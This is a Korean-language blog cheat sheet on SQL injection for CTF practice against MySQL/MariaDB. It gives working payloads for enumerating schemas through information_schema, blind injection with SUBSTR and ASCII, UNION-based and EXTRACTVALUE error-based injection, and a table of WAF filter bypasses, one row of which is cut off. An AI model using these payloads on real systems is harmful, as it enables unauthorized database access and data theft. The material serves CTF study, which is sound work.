---
title: "[SQLI] sql basic knowledge"
slug: sql-basic-knowledge
published: 2026-11-03
draft: false
description: SQL knowledge
categoryId: knowledge
lang: ko
---
# CTF SQL Injection (SQLi) 실전 치트시트 (MySQL / MariaDB 기준)

## 1. 주석(Comments) 및 구문 종료

쿼리의 뒷부분을 무효화하여 문법 에러를 방지할 때 사용합니다.

- `#` : URL 인코딩 시 `%23`으로 전송해야 정상 작동함 (GET/Cookie 파라미터 주의)

** `--`  *: 하이픈 두 개 뒤에* *반드시 공백(Space, `+`, `%20`)이 1개 이상** 있어야 주석으로 인식됨

** `/ ... */` : 인라인 주석. 공백 우회나 구문 중간 삽입에 활용

---

## 2. 데이터베이스 메타데이터 조회 `information_schema`)

테이블명이나 컬럼명을 모를 때 시스템 카탈로그에서 구조를 먼저 파악합니다.

### 2.1 현재 데이터베이스(Schema) 확인

```sql
SELECT database();
```

### 2.2 테이블(Table) 목록 조회

```sql
-- 전체 테이블 조회
SELECT table_name FROM information_schema.tables WHERE table_schema = database();

-- 서브쿼리용: 첫 번째 테이블 1개만 지정해서 가져오기 (LIMIT 활용)
(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0, 1)

-- 한 줄로 모든 테이블명 묶어서 보기 (GROUP_CONCAT 활용)
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = database();
```

### 2.3 컬럼(Column) 목록 조회

```sql
-- 특정 테이블('admin' 가정)의 전체 컬럼 조회
SELECT column_name FROM information_schema.columns WHERE table_schema = database() AND table_name = 'admin';

-- 서브쿼리용: 첫 번째 컬럼 1개만 가져오기
(SELECT column_name FROM information_schema.columns WHERE table_name = 'admin' LIMIT 0, 1)

-- 한 줄로 모든 컬럼명 묶어서 보기
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = 'admin';
```

## 3. Blind SQL Injection 필수 내장 함수

화면에 문자열이 직접 출력되지 않고 참/거짓(Boolean)이나 숫자, 시간 지연만 확인 가능할 때 사용합니다.

### 3.1 개수 및 길이 파악

COUNT(컬럼명) : 조회된 행(Row)의 개수를 반환

```sql
-- 현재 DB의 테이블 개수 확인
(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = database())
```

LENGTH(문자열) : 문자열의 바이트 길이 반환 (영문/숫자/특수문자는 글자당 1바이트)

```sql
-- 첫 번째 테이블 이름의 글자 수 확인
(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema = database() LIMIT 0, 1)
```

### 3.2 문자열 자르기 (인덱스는 무조건 1부터 시작)

SUBSTR(문자열, 시작위치, 길이)

SUBSTRING(문자열, 시작위치, 길이)

MID(문자열, 시작위치, 길이)

LEFT(문자열, 길이) / RIGHT(문자열, 길이)

```sql
-- 'admin'에서 첫 번째 글자 'a' 추출
SELECT SUBSTR('admin', 1, 1);
-- 'admin'에서 두 번째 글자 'd' 추출
SELECT SUBSTR('admin', 2, 1);
```

### 3.3 문자를 숫자로 변환 (ASCII / ORD / HEX)

ASCII(문자) / ORD(문자) : 문자를 아스키코드 10진수 정수로 변환
주요 아스키 범위: 숫자 0~~9 (48~~57), 대문자 A~~Z (65~~90), 소문자 a~~z (97~~122)

```sql
-- 첫 번째 테이블명의 첫 글자 아스키코드 추출 (숫자형 출력 채널이나 대소 비교에 사용)
(SELECT ASCII(SUBSTR(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema = database() LIMIT 0, 1)
```

HEX(문자열) : 문자열을 16진수(Hex) 값으로 변환

## 4. UNION SQL Injection 기본 패턴

화면에 쿼리 결과가 직접 출력될 때, 기존 쿼리 결과에 새로운 SELECT 결과를 이어 붙입니다.

```sql
-- Step 1: 기존 쿼리의 컬럼 개수 파악 (에러가 날 때까지 숫자를 늘림)
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#

-- Step 2: 화면에 출력되는 컬럼 위치 확인 (컬럼이 3개라고 가정)
' UNION SELECT 1, 2, 3#

-- Step 3: 출력되는 위치(예: 2번, 3번 자리)에 원하는 서브쿼리나 함수 삽입
' UNION SELECT 1, database(), group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
```

## 5. Error-Based SQL Injection

DB 에러 메시지가 화면에 그대로 노출될 때, 에러 메시지 안에 쿼리 실행 결과를 끼워 넣어 강제로 출력시킵니다.

EXTRACTVALUE() 활용 (MySQL 5.1+)

두 번째 인자(XPath)가 문법에 맞지 않으면 에러를 뱉으며 해당 문자열을 화면에 출력함 (0x3a는 콜론 :)

```sql
AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT database())))
```

## 6. CTF 단골 필터링(WAF) 우회 기법


|  |  |  |
| -------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------- |
| **필터링 대상** | **우회 방법 (Bypass)** | **예시** |
| **공백 (Space)** | 주석(`/**/`), 탭(`%09`), 개행(`%0a`), 괄호(`()`) 활용 | `SELECT/**/table_name/**/FROM...` 또는 `SELECT(table_name)FROM...` |
| **따옴표 (**`'`**,** `"`**)** | 문자열을 16진수(`0x...`) 또는 `CHAR()` 함수로 변환 | `WHERE table_name = 0x61646d696e` (`'admin'`과 동일) |
| **등호 (**`=`**)** | `LIKE`, `IN()`, `INSTR()`, 부등호(`<`, `>`), `BETWEEN` | `WHERE id LIKE 'admin'` 또는 `ASCII(...) IN (97)` |
| `AND` **/** `OR` | 기호 연산자 `&&` (URL 인코딩: `%26%26`), ` |  |
| **콤마 (**`,`**)** | `LIMIT 0, 1` -> `OFFSET` 활용 / `SUBSTR(str, 1, 1)` -> `FROM FOR` 활용 | `LIMIT 1 OFFSET 0` / `SUBSTR(pw FROM 1 FOR 1)` |
| **키워드 대소문자** | 대소문자 혼용 또는 이중 삽입(치환 필터링일 때) | `SeLeCt`, `selselectect` |


